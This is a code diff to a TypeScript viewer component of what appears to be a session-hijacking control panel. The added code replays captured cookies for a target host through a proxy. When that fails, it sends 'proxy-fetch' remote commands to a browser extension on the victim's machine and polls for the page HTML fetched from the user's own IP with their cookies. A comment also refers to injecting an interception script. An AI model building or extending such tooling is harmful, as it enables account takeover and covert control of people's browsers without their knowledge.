@@ -13,6 +13,7 @@ interface LiveSiteViewerProps {
   incident: {
     id: string;
     host: string;
+    machine_id: string;
     tab_url?: string;
     cookie_data?: any;
     full_cookie_data?: any;
@@ -118,38 +119,124 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     }
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
-  // Fetch raw content from backend (cookies + DNS tunnel via site-proxy)
+  // Fetch raw content - tries site-proxy first, then extension as fallback
   const fetchRawContent = async (url: string): Promise<string> => {
     const proxyIncidentId = incidentIdForProxy || incident.id;
-    console.log('[LocalProxy] Fetching with', cookies.length, 'parsed cookies for:', url);
     
-    const response = await fetch(`${PROXY_BASE}?incident=${proxyIncidentId}`, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        url,
-        cookies: cookies,  // Send parsed cookies from state
-        rawContent: true
-      })
-    });
-    
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
+    // Try site-proxy first (fast for public sites)
+    try {
+      console.log('[LocalProxy] Trying site-proxy for:', url);
+      
+      const response = await fetch(`${PROXY_BASE}?incident=${proxyIncidentId}`, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          url,
+          cookies: cookies,
+          rawContent: true
+        })
+      });
+      
+      if (response.ok) {
+        console.log('[LocalProxy] ✅ site-proxy succeeded');
+        return await response.text();
+      }
+      
+      // If 403 or 500, try extension fallback
+      console.log(`[LocalProxy] site-proxy failed (${response.status}), trying extension...`);
+    } catch (proxyError) {
+      console.log('[LocalProxy] site-proxy error, trying extension:', proxyError);
     }
     
-    // Log debug headers
-    const debugCookieCount = response.headers.get('X-Debug-Cookie-Count');
-    const debugSource = response.headers.get('X-Debug-Cookie-Source');
-    const debugSessionType = response.headers.get('X-Debug-Session-Type');
-    console.log('[LocalProxy] Response:', {
-      cookieCount: debugCookieCount,
-      source: debugSource,
-      sessionType: debugSessionType
+    // Fallback: Use extension proxy (works with user's IP)
+    console.log('[ExtensionProxy] Requesting fetch via extension');
+    
+    // 1. Get active session
+    const domain = new URL(url).hostname;
+    const { data: sessions } = await supabase
+      .from('active_sessions')
+      .select('*')
+      .eq('domain', domain)
+      .eq('machine_id', incident.machine_id)
+      .eq('is_active', true)
+      .order('last_activity', { ascending: false })
+      .limit(1);
+    
+    const activeSession = sessions?.[0];
+    
+    if (!activeSession) {
+      throw new Error('Nenhuma sessão ativa encontrada. Usuário pode estar offline.');
+    }
+    
+    // 2. Create command
+    const { data: commandData, error: commandError } = await supabase
+      .from('remote_commands')
+      .insert({
+        target_machine_id: incident.machine_id,
+        target_tab_id: activeSession.tab_id,
+        target_domain: domain,
+        command_type: 'proxy-fetch',
+        payload: {
+          target_url: url,
+          cookies: cookies,
+          command_id: crypto.randomUUID()
+        },
+        executed_by: (await supabase.auth.getUser()).data.user?.id
+      })
+      .select('id')
+      .single();
+    
+    if (commandError) {
+      throw new Error(`Falha ao criar comando: ${commandError.message}`);
+    }
+    
+    const commandId = commandData.id;
+    console.log('[ExtensionProxy] Command created:', commandId);
+    
+    // 3. Send via dispatcher
+    const { data: dispatchData } = await supabase.functions.invoke('command-dispatcher', {
+      body: {
+        command_id: commandId,
+        command_type: 'proxy-fetch',
+        target_machine_id: incident.machine_id,
+        target_tab_id: activeSession.tab_id,
+        payload: {
+          target_url: url,
+          cookies: cookies,
+          command_id: commandId
+        }
+      }
     });
     
-    return await response.text();
+    console.log('[ExtensionProxy] Dispatch result:', dispatchData);
+    
+    // 4. Poll for result in popup_responses
+    const maxAttempts = 30; // 15 seconds
+    for (let i = 0; i < maxAttempts; i++) {
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      const { data: responses } = await supabase
+        .from('popup_responses')
+        .select('*')
+        .eq('command_id', commandId)
+        .maybeSingle();
+      
+      if (responses?.form_data) {
+        console.log('[ExtensionProxy] ✅ Got response from extension');
+        
+        const formData = responses.form_data as any;
+        
+        if (formData.error || !formData.success) {
+          throw new Error(`Extension fetch failed: ${formData.error || 'Unknown error'}`);
+        }
+        
+        return formData.html_content;
+      }
+    }
+    
+    throw new Error('Timeout aguardando resposta da extensão (15s). Usuário pode estar offline.');
   };
 
   // Process HTML content locally: rewrite URLs and inject interception script
